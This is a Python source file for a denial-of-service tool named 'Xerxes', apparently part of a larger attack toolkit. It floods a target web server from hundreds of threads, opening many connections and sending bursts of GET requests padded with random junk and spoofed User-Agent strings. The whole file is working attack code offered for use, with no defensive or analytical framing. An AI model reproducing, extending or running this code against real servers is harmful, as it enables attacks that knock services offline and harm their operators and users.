import socket
import ssl
import random
import threading
import time
from urllib.parse import urlparse
from core.useragent import UserAgent

class Xerxes:
    def __init__(self, url, threads=500, sockets=1000, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.is_ssl = parsed.scheme == 'https'
        self.path = parsed.path or '/'
        self.threads = threads
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, self.port))
                
                if self.is_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                
                # Xerxes fires bursts of requests
                for _ in range(100):
                    if not self.running: break
                    junk = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=random.randint(500, 2000)))
                    req = (
                        f"GET {self.path}?{random.randint(0, 999999)}={junk} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"User-Agent: {UserAgent.random_agent()}\r\n"
                        f"Accept: */*\r\n"
                        f"\r\n"
                    )
                    try:
                        s.send(req.encode())
                        if self.stats:
                            self.stats.increment_sent()
                            self.stats.add_bytes(len(req))
                    except: break
                
                s.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
    
    def attack(self):
        self.running = True
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        self.running = False
